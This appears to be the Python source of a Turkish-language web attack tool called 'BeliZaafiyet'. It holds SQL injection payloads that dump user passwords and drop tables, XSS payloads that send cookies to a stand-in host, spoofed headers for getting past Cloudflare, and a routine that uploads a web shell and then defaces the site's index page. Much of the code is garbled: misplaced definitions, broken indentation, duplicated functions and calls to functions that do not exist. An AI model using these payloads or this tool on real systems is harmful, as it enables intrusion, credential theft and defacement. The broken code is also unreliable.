import os
import sys
import time
import platform
import random
from datetime import datetime
import requests
from rich.console import Console
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
console = Console()
found_vulnerabilities = set()
from urllib.parse import urlparse, parse_qs
from bs4 import BeautifulSoup

durum = "Pasif"

def temizle():
    os.system('cls' if os.name == 'nt' else 'clear')


def report_vulnerability(vuln_type, url):
    key = f"{vuln_type}|{url}"
    if key not in found_vulnerabilities:
        console.rule("[bold red]ZAFİYET TESPİT EDİLDİ[/bold red]")
        console.print(f"[bold yellow]Tür:[/bold yellow] {vuln_type}")
        console.print(f"[bold cyan]URL:[/bold cyan] {url}")
        console.rule("")
        log_yaz(f"{vuln_type} Açığı: {url}")
        found_vulnerabilities.add(key)

def log_yaz(mesaj):
    with open("belizaafiyet.log", "a") as f:
        f.write(f"[{datetime.now()}] {mesaj}\n")

def giris_ekrani():
    temizle()

    ascii_logo = r"""
    \033[91m
    ____  ______ _      _____ _     _    _  _____
    |  _ \|  ____| |    |_   _| |   | |  | |/ ____|
    | |_) | |__  | |      | | | |   | |  | | (___
    |  _ <|  __| | |      | | | |   | |  | |\___ \
    | |_) | |____| |____ _| |_| |___| |__| |____) |
    |____/|______|______|_____|______\____/|_____/

    \033[0m
    """

    sloganlar = [
        "Web Exploitation for Elite Hackers.",
        "Target Acquired. Vulnerability Detected.",
        "Your Web Weakness is My Playground.",
        "404 Security Not Found.",
        "Inject. Exploit. Control.",
        "Scan Fast, Hack Faster.",
        "Zafiyet avcısı burada!"
    ]

    slogan = random.choice(sloganlar)

    print(f"\033[92m{ascii_logo}\033[0m")
    print(f"\033[91m{slogan}\033[0m")
    print("\033[94mYapımcı: @BelilusKurucu | Aracın adı: BeliZaafiyet\033[0m")
    print(f"Sistem: {platform.system()} {platform.release()}  |  Zaman: {datetime.now()}")
    print("-" * 80)

def yardim():
    print(" - sqli       : SQL Injection derin analiz modülünü başlatır (SQLmap tarzı)\n")

    print("\n[+] Komutlar / Commands:")
    print(" - start     : Sistemi başlat / Start system")
    print(" - stop      : Sistemi durdur / Stop system")
    print(" - status    : Sistem durumu / Show system status")
    print(" - help      : Yardım menüsü / Help menu")
    print(" - exit      : Çıkış yap / Exit program\n")
    print(" - header    : Güvenlik başlıklarını analiz et / Analyze security headers")
    print(" - sqli      : SQL Injection testi yap / Perform SQL Injection test")
    print(" - xss       : XSS testi yap / Perform XSS test")
    print(" - upload    : Dosya yükleme zafiyeti testi yap / Perform file upload vulnerability test")

def sistem_baslat():
    global durum
    if durum == "Aktif":
        console.print("[yellow][!] Sistem zaten aktif.[/yellow]")
    else:
        durum = "Aktif"
        console.print("[bold green][✓] Sistem başlatıldı.[/bold green]")
        log_yaz("Sistem başlatıldı.")

def sistem_durdur():
    global durum
    if durum == "Pasif":
        console.print("[yellow][!] Sistem zaten pasif.[/yellow]")
    else:
        durum = "Pasif"
        console.print("[bold red][✓] Sistem durduruldu.[/bold red]")
        log_yaz("Sistem durduruldu.")

def durum_goster():
    console.print(f"[blue][i] Sistem Durumu: {durum}[/blue]")
    log_yaz(f"Durum sorgulandı: {durum}")

    gerekli_basliklar = [
    "Content-Security-Policy",
    "Strict-Transport-Security",
    "X-Content-Type-Options",
    "X-Frame-Options",
    "X-XSS-Protection",
    "Referrer-Policy",
    "Permissions-Policy",
    "Cache-Control",
    "Feature-Policy",
    "X-Permitted-Cross-Domain-Policies",
    "Access-Control-Allow-Origin",
    ]

def header_strength_check(header, header_value):
    if header == "Strict-Transport-Security":
        if "max-age" not in header_value or "includeSubDomains" not in header_value:
            return "Eksik: 'max-age' veya 'includeSubDomains' parametreleri yanlış"
        elif "max-age=31536000" not in header_value:
            return "Zayıf: 'max-age' değeri çok kısa"
    elif header == "X-Content-Type-Options":
        if header_value.lower() != "nosniff":
            return "Zayıf: 'nosniff' ayarı eksik"
    elif header == "Content-Security-Policy":
        if "default-src" not in header_value or "script-src" not in header_value:
            return "Eksik: 'default-src' veya 'script-src' ayarları yanlış"
    elif header == "X-Frame-Options":
        if header_value.lower() not in ["deny", "sameorigin"]:
            return "Zayıf: 'X-Frame-Options' ayarı eksik veya yanlış"
    elif header == "X-XSS-Protection":
        if header_value != "1; mode=block":
            return "Zayıf: 'X-XSS-Protection' ayarı eksik veya yanlış"
    elif header == "Cache-Control":
        if "no-store" not in header_value and "no-cache" not in header_value:
            return "Zayıf: 'no-store' veya 'no-cache' parametreleri eksik"
    elif header == "Feature-Policy":
        if "geolocation" not in header_value or "notifications" not in header_value:
            return "Eksik: 'geolocation' veya 'notifications' özellikleri eksik"
    elif header == "X-Permitted-Cross-Domain-Policies":
        if header_value.lower() != "none":
            return "Zayıf: Flash/Java için geçerli politikalar eksik veya yanlış"
    elif header == "Access-Control-Allow-Origin":
        if "*" in header_value:
            return "Zayıf: 'Access-Control-Allow-Origin' değeri '*' kullanmak yerine daha sıkı ayarlanmalı"
    return None

def baslik_analiz(url, dil):
    try:
        if not url.startswith("http"):
            url = "http://" + url

        response = requests.get(url, timeout=10)
        headers = response.headers

        print("="*60)
        print(f" Hedef: {url}")
        print(f" Durum Kodu: {response.status_code}")
        print("="*60)

        os.makedirs("loglar", exist_ok=True)
        log_yolu = f"loglar/baslik_analiz.log"
        log = open(log_yolu, "a", encoding="utf-8")
        log.write(f"\n--- {datetime.datetime.now()} - {url} ---\n")

        guvenlik_bosluklari = []
        for key, value in headers.items():
            print(f"{key}: {value}")
            log.write(f"{key}: {value}\n")

        for baslik in gerekli_basliklar:
            if baslik not in headers:
                guvenlik_bosluklari.append(f"{baslik} başlığı eksik")
            else:
                result = header_strength_check(baslik, headers[baslik])
                if result:
                    guvenlik_bosluklari.append(f"{baslik}: {result}")

        if guvenlik_bosluklari:
            if dil == "tr":
                print("\n⚠️ Güvenlik başlıklarında eksiklikler ve zayıflıklar bulundu:")
            else:
                print("\n⚠️ Missing or weak security headers found:")
            for b in guvenlik_bosluklari:
                print(f" - {b}")
                log.write(f" Eksik veya Zayıf: {b}\n")
        else:
            if dil == "tr":
                print("\n✅ Tüm temel güvenlik başlıkları mevcut ve güçlü.")
            else:
                print("\n✅ All essential security headers are present and strong.")

        log.close()

    except requests.exceptions.RequestException as e:
        if dil == "tr":
            print(f"❌ Hedefe erişilemedi: {e}")
        else:
            print(f"❌ Could not access target: {e}")

    sql_payloads = [
    "' OR 1=1 --",
    "' OR 'a'='a",
    "' OR 1=1#",
    "' UNION SELECT NULL, username, password FROM users --",

    "' AND 1=1 --",
    "' AND 1=2 --",
    "' AND 'a'='a' --",
    "' AND 'a'!='a' --",

    "' OR SLEEP(5) --",
    "' AND 1=1 AND SLEEP(5) --",
    "' AND 1=1 WAITFOR DELAY '0:0:5' --",

    "' UNION SELECT 1,2,3 --",
    "' UNION ALL SELECT NULL, username, password FROM users --",
    "' UNION SELECT NULL, table_name, column_name FROM information_schema.columns --",

    "' AND 1=1 --",
    "' AND 1=2 --",
    "' AND 'a'='a' --",
    "' AND 'a'!='a' --",

    "' OR (SELECT COUNT(*) FROM users WHERE username = 'admin') = 1 --",
    "' OR (SELECT password FROM users WHERE username = 'admin') LIKE '%1234%' --",

    "'; DROP TABLE users --",
    "'; EXEC xp_cmdshell('dir') --",

    "' AND 1=1 AND SLEEP(5) --",
    "' AND 1=1 WAITFOR DELAY '0:0:5' --",

    "' OR 1=1 --",
    "' AND 1=1 --",
    "' OR 'a'='a' --",

    "' UNION SELECT 1,2,3,4 FROM users --",
    "' AND 1=1 --",
    "'; SELECT * FROM users --",
    "' AND EXISTS(SELECT * FROM users WHERE username='admin') --",

    "' OR SLEEP(5) --",
    "' AND 1=1 AND SLEEP(5) --",
    "' AND 1=1 WAITFOR DELAY '0:0:5' --",

    "' UNION SELECT NULL, username, password, 1 FROM users --",
    "' UNION SELECT NULL, table_name, column_name FROM information_schema.columns --",

    "' AND 1=1 --",
    "' AND 1=2 --",
    "' AND 'a'='a' --",
    "' AND 'a'!='a' --",

    "'; SELECT * FROM users --",
    "' OR 1=1 --",
    "' AND 'a'='a' --",
    ]

def sql_injection_test(url, dil="TR"):
    print(f"[i] Test edilen Hedef: {url}")

    if not url.startswith("http"):
        url = "http://" + url

    try:
        for payload in sql_payloads:
            test_url = url + payload
            response = requests.get(test_url, timeout=10)

            if payload in response.text or "error" in response.text.lower() or response.status_code == 500:
                print(f"[!] SQL Injection açığı tespit edilmiş olabilir: {test_url}")
                log_yaz(f"SQLi Açığı: {test_url}")

        parsed_url = urlparse(url)
        query_params = parse_qs(parsed_url.query)

        if query_params:
            print("[i] Parametreler tespit edildi, her birini test ediyorum...")
            for param, values in query_params.items():
                for value in values:
                    for payload in sql_payloads:
                        test_url = url.replace(f"{param}={value}", f"{param}={value}{payload}")
                        response = requests.get(test_url, timeout=10)

                        if payload in response.text or "error" in response.text.lower() or response.status_code == 500:
                            print(f"[!] SQL Injection açığı tespit edilmiş olabilir: {test_url}")
                            log_yaz(f"SQLi Açığı: {test_url}")

        print("[i] Error-based SQLi Testi Yapılıyor...")
        for param in ["' AND 1=1 --", "' AND 1=2 --"]:
            test_url = url + param
            response = requests.get(test_url, timeout=10)

            if "error" in response.text.lower():
                print(f"[!] Error-based SQLi açığı tespit edilmiş olabilir: {test_url}")
                log_yaz(f"Error-based SQLi: {test_url}")

        print("[i] Blind SQLi Testi Yapılıyor...")
        for param in ["' AND 1=1 --", "' AND 1=2 --", "' AND 'a'='a' --", "' AND 'a'!='a' --"]:
            test_url = url + param
            response = requests.get(test_url, timeout=10)

            if "error" in response.text.lower():
                print(f"[!] Blind SQLi (Boolean-based) açığı tespit edilmiş olabilir: {test_url}")
                log_yaz(f"Blind SQLi (Boolean-based): {test_url}")

        print("[i] Union-based SQLi Testi Yapılıyor...")
        for payload in ["' UNION SELECT NULL, username, password FROM users --", "' UNION SELECT 1,2,3 --"]:
            test_url = url + payload
            response = requests.get(test_url, timeout=10)

            if "username" in response.text.lower() and "password" in response.text.lower():
                print(f"[!] Union-based SQLi açığı tespit edilmiş olabilir: {test_url}")
                log_yaz(f"Union-based SQLi Açığı: {test_url}")

        print("[i] Time-based Blind SQLi Testi Yapılıyor...")
        for payload in ["' OR SLEEP(5) --", "' AND 1=1 AND SLEEP(5) --"]:
            test_url = url + payload
            start_time = time.time()
            response = requests.get(test_url, timeout=10)
            end_time = time.time()

            if (end_time - start_time) > 4.5:
                print(f"[!] Time-based Blind SQLi açığı tespit edilmiş olabilir: {test_url}")
                log_yaz(f"Time-based Blind SQLi: {test_url}")

    except requests.exceptions.RequestException as e:
        print(f"❌ Hedefe erişilemedi: {e}")
        log_yaz(f"Hedefe erişilemedi: {e}")

    xss_payloads = [
    "<script>alert('XSS')</script>",
    "<img src='x' onerror='alert(1)'>",
    "<svg/onload=alert('XSS')>",
    "<a href='javascript:alert(1)'>Click me</a>",
    "<iframe src='javascript:alert(1)'></iframe>",
    "<body onload=alert('XSS')>",
    "<input onfocus=alert('XSS') autofocus>",
    "<script>window.location='http://malicious.com?cookie='+document.cookie</script>",
    "<script>document.location='http://malicious.com?cookie='+document.cookie</script>",
    "<style>body{background:url('javascript:alert(1)');}</style>",
    "<img src='x' onerror='alert(1)' onload='alert(1)'>",
    "<meta http-equiv='refresh' content='0;url=javascript:alert(1)'>",
    "<script>eval('alert(1)')</script>",
    "<script>setTimeout(function(){alert(1)}, 1000);</script>",
    "<script>setInterval(function(){alert(1)}, 1000);</script>",
    "<script>document.write('<img src=\"x\" onerror=\"alert(1)\">')</script>",
    "<script>document.body.appendChild(document.createElement('img')).setAttribute('src','x');</script>",
    ]

def xss_test(url, dil="TR"):
    print(f"[i] Test edilen Hedef: {url}")

    if not url.startswith("http"):
        url = "http://" + url

    try:
        response = requests.get(url, timeout=10)
        page_content = response.text

        soup = BeautifulSoup(page_content, "html.parser")

        print("[i] URL Parametreleri üzerinden XSS Testi yapılıyor...")
        parsed_url = urlparse(url)
        query_params = parse_qs(parsed_url.query)

        if query_params:
            for param, values in query_params.items():
                for value in values:
                    for payload in xss_payloads:
                        test_url = url.replace(f"{param}={value}", f"{param}={value}{payload}")
                        response = requests.get(test_url, timeout=10)

                        if payload in response.text:
                            print(f"[!] XSS açığı tespit edildi: {test_url}")
                            log_yaz(f"XSS Açığı: {test_url}")
                        else:
                            print(f"[✓] XSS açığı tespit edilmedi: {test_url}")

        print("[i] Formlar üzerinden XSS Testi yapılıyor...")
        forms = soup.find_all("form")

        for form in forms:
            action = form.get("action")
            method = form.get("method", "get").lower()
            inputs = form.find_all("input")
            data = {}

            for input_field in inputs:
                name = input_field.get("name")
                if name:
                    data[name] = xss_payloads[0]

            if action and not action.startswith("http"):
                action_url = urlparse(url)._replace(path=action).geturl()
            else:
                action_url = action if action else url

            if method == "post":
                response = requests.post(action_url, data=data, timeout=10)
            else:
                response = requests.get(action_url, params=data, timeout=10)

            if any(payload in response.text for payload in xss_payloads):
                print(f"[!] Stored XSS açığı tespit edildi: {action_url}")
                log_yaz(f"Stored XSS Açığı: {action_url}")
            else:
                print(f"[✓] Stored XSS açığı tespit edilmedi: {action_url}")

        print("[i] DOM Manipülasyonu üzerinden XSS Testi yapılıyor...")
        for payload in xss_payloads:
            test_url = url + payload
            response = requests.get(test_url, timeout=10)

            if payload in response.text:
                print(f"[!] DOM-based XSS açığı tespit edildi: {test_url}")
                log_yaz(f"DOM-based XSS Açığı: {test_url}")
            else:
                print(f"[✓] DOM-based XSS açığı tespit edilmedi: {test_url}")

        print("[i] JavaScript metodları üzerinden XSS Testi yapılıyor...")
        for payload in xss_payloads:
            test_url = f"{url}?test={payload}"
            response = requests.get(test_url, timeout=10)

            if payload in response.text:
                print(f"[!] JavaScript tabanlı XSS açığı tespit edildi: {test_url}")
                log_yaz(f"JavaScript XSS Açığı: {test_url}")
            else:
                print(f"[✓] JavaScript tabanlı XSS açığı tespit edilmedi: {test_url}")

        print("[i] Error-based XSS Testi yapılıyor...")
        for payload in xss_payloads:
            test_url = f"{url}?test={payload}"
            response = requests.get(test_url, timeout=10)

            if "error" in response.text.lower():
                print(f"[!] Error-based XSS açığı tespit edildi: {test_url}")
                log_yaz(f"Error-based XSS Açığı: {test_url}")
            else:
                print(f"[✓] Error-based XSS açığı tespit edilmedi: {test_url}")

    except requests.exceptions.RequestException as e:
        print(f"❌ Hedefe erişilemedi: {e}")
        log_yaz(f"Hedefe erişilemedi: {e}")

    class BeliZaafiyet:
    def __init__(self, url):
        self.url = url
        self.shell_url = None
        self.index_url = None
        self.upload_dir = "uploads"


def report_vulnerability(vuln_type, url):
    key = f"{vuln_type}|{url}"
    if key not in found_vulnerabilities:
        console.rule("[bold red]ZAFİYET TESPİT EDİLDİ[/bold red]")
        console.print(f"[bold yellow]Tür:[/bold yellow] {vuln_type}")
        console.print(f"[bold cyan]URL:[/bold cyan] {url}")
        console.rule("")
        log_yaz(f"{vuln_type} Açığı: {url}")
        found_vulnerabilities.add(key)

def log_yaz(self, message):
        with open("beliZaafiyet_upload.log", "a") as log_file:
            log_file.write(f"[{time.ctime()}] {message}\n")

    def test_file_upload(self):
        print(f"[i] Dosya yükleme testi yapılıyor: {self.url}")
        test_url = f"{self.url}/upload"
        with open("test.txt", "w") as f:
            f.write("Bu bir test dosyasıdır.")
        test_file = {'file': ('test.txt', open('test.txt', 'rb'), 'text/plain')}

        try:
            response = requests.post(test_url, files=test_file, timeout=10)
            if response.status_code == 200 and ("uploaded" in response.text.lower() or "success" in response.text.lower()):
                print("[✓] Dosya yükleme zafiyeti tespit edildi.")
                self.log_yaz(f"Dosya yükleme zafiyeti tespit edildi: {self.url}")
                return True
            else:
                print(f"[✘] Dosya yükleme zafiyeti tespit edilmedi. Durum kodu: {response.status_code}, Yanıt: {response.text[:100]}...")
                return False
        except requests.exceptions.RequestException as e:
            print(f"[✘] Hata oluştu: {e}")
            self.log_yaz(f"Dosya yükleme testi hatası: {e}")
            return False
        finally:
            if os.path.exists("test.txt"):
                os.remove("test.txt")

    def validate_file(self, file_path):
        allowed_extensions = ['.php', '.exe', '.jsp', '.html', '.txt', '.asp', '.aspx']
        max_size = 5 * 1024 * 1024

        if not os.path.exists(file_path):
            print(f"[✘] Dosya bulunamadı: {file_path}")
            return False

        _, ext = os.path.splitext(file_path)
        if ext.lower() not in allowed_extensions:
            print(f"[✘] Geçersiz dosya uzantısı: {ext}. İzin verilenler: {', '.join(allowed_extensions)}")
            self.log_yaz(f"Geçersiz dosya uzantısı: {file_path}")
            return False

        file_size = os.path.getsize(file_path)
        if file_size > max_size:
            print(f"[✘] Dosya boyutu çok büyük ({file_size / (1024*1024):.2f}MB). Maksimum boyut: {max_size / (1024*1024):.0f}MB")
            self.log_yaz(f"Dosya boyutu çok büyük: {file_path}")
            return False

        return True

    def upload_file(self, file_path, file_type):
        if not self.validate_file(file_path):
            return False

        print(f"[i] {file_type} yükleniyor: {file_path}")
        upload_url = f"{self.url}/upload"
        files = {'file': (os.path.basename(file_path), open(file_path, 'rb'))}

        try:
            response = requests.post(upload_url, files=files, timeout=30)
            if response.status_code == 200 and ("uploaded" in response.text.lower() or "success" in response.text.lower()):
                uploaded_url = f"{self.url}/{self.upload_dir}/{os.path.basename(file_path)}"
                print(f"[✓] {file_type} başarıyla yüklendi: {uploaded_url}")
                self.log_yaz(f"{file_type} yüklendi: {uploaded_url}")
                return uploaded_url
            else:
                print(f"[✘] {file_type} yüklenemedi. Durum kodu: {response.status_code}, Yanıt: {response.text[:100]}...")
                return False
        except requests.exceptions.RequestException as e:
            print(f"[✘] Hata oluştu: {e}")
            self.log_yaz(f"{file_type} yükleme hatası: {e}")
            return False

    def upload_shell(self):
        custom_shell_path = input("Shell dosyasının yolunu girin (örneğin, b374k.php): ").strip()
        if not custom_shell_path:
            print("[!] Shell dosya yolu boş bırakılamaz.")
            return False
        return self.upload_file(custom_shell_path, "Shell")

    def upload_index(self):
        index_file_path = input("Kendi index dosyanızı yüklemek için dosya yolunu girin (varsayılan: index.html): ").strip()
        if not index_file_path:
            index_file_path = "index.html"
            if not os.path.exists(index_file_path):
                with open(index_file_path, "w") as f:
                    f.write("<html><body><h1>Defaced by BeliZaafiyet</h1></body></html>")
                print(f"[i] '{index_file_path}' dosyası oluşturuldu.")
        return self.upload_file(index_file_path, "Index")

    def check_status(self):
        print("\n--- Yükleme Durumu ---")
        if self.shell_url:
            print(f"[i] Shell URL: {self.shell_url}")
        else:
            print("[✘] Shell yüklenmedi.")

        if self.index_url:
            print(f"[i] Index URL: {self.index_url}")
        else:
            print("[✘] Index.html yüklenmedi.")
        print("----------------------")



    import rich
    from rich.console import Console
    from requests.adapters import HTTPAdapter
    from urllib3.util.retry import Retry

    console = Console()
    found_vulnerabilities = set()

def bypass_ayarli_session():
    session = requests.Session()
    retry = Retry(total=5, backoff_factor=1, status_forcelist=[403, 429, 503])
    adapter = HTTPAdapter(max_retries=retry)
    session.mount("http://", adapter)
    session.mount("https://", adapter)
    return session

def cf_bypass_headers():
    return {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        "X-Forwarded-For": "127.0.0.1",
        "CF-Connecting-IP": "127.0.0.1",
        "X-Real-IP": "127.0.0.1",
        "Accept-Encoding": "gzip, deflate",
        "Cache-Control": "no-cache"
    }

def scan_all(target_url, file_upload_tool):
    sistem_baslat()
    baslik_analiz(target_url, "tr")
    sql_injection_test(target_url, "tr")
    xss_test(target_url, "tr")
    if file_upload_tool.test_file_upload():
        shell_uploaded = file_upload_tool.upload_shell()
        if shell_uploaded:
            file_upload_tool.shell_url = shell_uploaded
        index_uploaded = file_upload_tool.upload_index()
        if index_uploaded:
            file_upload_tool.index_url = index_uploaded
        file_upload_tool.check_status()

def main():
    giris_ekrani()

    target_url = input("Hedef URL'yi girin (örneğin, http://site.com): ").strip()
    if not target_url:
        console.print("[red][!] Hedef URL boş bırakılamaz. Çıkılıyor...[/red]")
        sys.exit(1)

    file_upload_tool = BeliZaafiyet(target_url)

    while True:
        try:
            komut = input("BeliZaafiyet > ").strip().lower()
            if komut == "start":
                sistem_baslat()
            elif komut == "stop":
                sistem_durdur()
            elif komut == "status":
                durum_goster()
            elif komut == "help":
                yardim()
            elif komut == "header":
                baslik_analiz(target_url, "tr")
            elif komut == "sqli":
                sql_injection_test(target_url, "tr")
            elif komut == "xss":
                xss_test(target_url, "tr")
            elif komut == "upload":
                if file_upload_tool.test_file_upload():
                    shell_uploaded = file_upload_tool.upload_shell()
                    if shell_uploaded:
                        file_upload_tool.shell_url = shell_uploaded
                    index_uploaded = file_upload_tool.upload_index()
                    if index_uploaded:
                        file_upload_tool.index_url = index_uploaded
                    file_upload_tool.check_status()
            elif komut == "exit":
                console.print("[red][!] Çıkılıyor...[/red]")
                break
            else:
                console.print("[yellow][?] Bilinmeyen komut. 'help' yaz yardım al.[/yellow]")
        except KeyboardInterrupt:
            console.print("\n[red][!] Klavye ile durduruldu.[/red]")
            break
        except Exception as e:
            print(f"[✘] Bir hata oluştu: {e}")
            log_yaz(f"Genel hata: {e}")

    if __name__ == "__main__":
    main()



def sqli_module(target_url):
    console.rule("[bold red]SQLmap Modu Başladı[/bold red]")
    console.print(f"[cyan]Hedef:[/cyan] {target_url}\n")

    while True:
        console.print("""
    [bold yellow][1][/bold yellow] Açıkları Tara
    [bold yellow][2][/bold yellow] Veritabanlarını Listele
    [bold yellow][3][/bold yellow] Tabloları Listele
    [bold yellow][4][/bold yellow] Sütunları Listele
    [bold yellow][5][/bold yellow] Verileri Çek
    [bold yellow][0][/bold yellow] Ana menüye dön
    """)

        secim = input("Seçim > ").strip()

        if secim == "1":
            sql_injection_test(target_url)
        elif secim == "2":
            enumerate_dbs(target_url)
        elif secim == "3":
            db = input("Veritabanı adı: ").strip()
            if db:
                enumerate_tables(target_url, db)
        elif secim == "4":
            db = input("Veritabanı: ").strip()
            tbl = input("Tablo: ").strip()
            if db and tbl:
                enumerate_columns(target_url, db, tbl)
        elif secim == "5":
            db = input("Veritabanı: ").strip()
            tbl = input("Tablo: ").strip()
            col = input("Sütun (virgülle ayır): ").strip()
            if db and tbl and col:
                dump_data(target_url, db, tbl, col.split(','))
        elif secim == "0":
            console.print("[cyan]Ana menüye dönülüyor...[/cyan]")
            break
        else:
            console.print("[red]Geçersiz seçim.[/red]")
